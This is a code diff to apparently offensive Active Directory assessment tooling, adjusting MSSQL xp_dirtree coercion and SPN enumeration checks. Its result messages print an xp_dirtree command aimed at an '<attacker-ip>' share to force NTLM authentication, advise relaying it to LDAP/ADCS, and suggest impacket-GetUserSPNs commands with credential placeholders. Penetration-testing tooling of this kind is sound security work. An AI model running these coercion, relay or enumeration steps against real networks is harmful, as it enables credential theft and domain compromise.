@@ -537,7 +537,7 @@ class MssqlXpDirtreeCoercionCheck(BaseCheck):
                     name=self.name, status=Status.PASS,
                     detail=(
                         f"SQL access confirmed on {host} — xp_dirtree coercion available. "
-                        "Execute: `EXEC xp_dirtree '\\\\<attacker>\\share'` "
+                        "Execute: `EXEC master.sys.xp_dirtree '\\\\<attacker-ip>\\demontlm',1,1` "
                         "to coerce the SQL service account into authenticating. "
                         "Relay that auth to LDAP/ADCS — no WebClient or PrinterBug needed."
                     ),
@@ -585,6 +585,9 @@ class MssqlSpnCheck(BaseCheck):
     ]
 
     def _run(self) -> CheckResult:
+        getuserspns_available = True
+        getuserspns_ran       = False
+
         # ── Method 1: impacket-GetUserSPNs ────────────────────────────────
         try:
             cmd = [
@@ -597,16 +600,33 @@ class MssqlSpnCheck(BaseCheck):
                 timeout=self.env.timeout + 15,
             )
             combined = r.stdout + r.stderr
+            getuserspns_ran = True
 
             if r.returncode != -1 and self.SPN_PREFIX in combined.lower():
                 spns = self._parse_getuserspns_output(combined)
                 if spns:
                     return self._format_result(spns)
 
+            # Tool ran but no MSSQLSvc SPNs in output — domain genuinely has none
+            # (or the account lacks permission to read them)
+            if getuserspns_ran and r.returncode != -1:
+                combined_lower = combined.lower()
+                if "no entries found" in combined_lower or "principal" not in combined_lower:
+                    return CheckResult(
+                        name=self.name, status=Status.SKIP,
+                        detail=(
+                            f"No MSSQLSvc SPNs found in {self.env.domain} — "
+                            "MSSQL service account not registered via SPN in this domain. "
+                            "If MSSQL runs in a trusted domain, run manually with -target-domain: "
+                            f"`impacket-GetUserSPNs {self.env.domain}/<user>:<pass> "
+                            f"-dc-ip {self.env.dc_ip} -target-domain <trusted-domain>`"
+                        ),
+                    )
+
         except FileNotFoundError:
-            pass  # fall through to ldap3
+            getuserspns_available = False  # fall through to ldap3
         except subprocess.TimeoutExpired:
-            pass
+            getuserspns_available = False
 
         # ── Method 2: ldap3 direct SPN query ──────────────────────────────
         if LDAP3_AVAILABLE:
@@ -629,6 +649,19 @@ class MssqlSpnCheck(BaseCheck):
                     conn.unbind()
                     if spns:
                         return self._format_result(spns)
+
+                    # ldap3 connected and queried but found nothing
+                    return CheckResult(
+                        name=self.name, status=Status.SKIP,
+                        detail=(
+                            f"No MSSQLSvc SPNs registered in {self.env.domain}. "
+                            "MSSQL may be running without a registered SPN, or the service "
+                            "account is in a trusted domain. "
+                            "Check cross-domain with: "
+                            f"`impacket-GetUserSPNs {self.env.domain}/<user>:<pass> "
+                            f"-dc-ip {self.env.dc_ip} -target-domain <trusted-domain>`"
+                        ),
+                    )
                 except Exception as e:
                     return CheckResult(
                         name=self.name, status=Status.SKIP,
@@ -640,10 +673,11 @@ class MssqlSpnCheck(BaseCheck):
                     except Exception:
                         pass
 
+        # Both methods unavailable
         return CheckResult(
             name=self.name, status=Status.SKIP,
             detail=(
-                "Could not enumerate MSSQL SPNs — impacket-GetUserSPNs and ldap3 both unavailable. "
+                "Could not check MSSQL SPNs — impacket-GetUserSPNs not found and ldap3 unavailable. "
                 "Run manually: "
                 "`impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc>`"
             ),
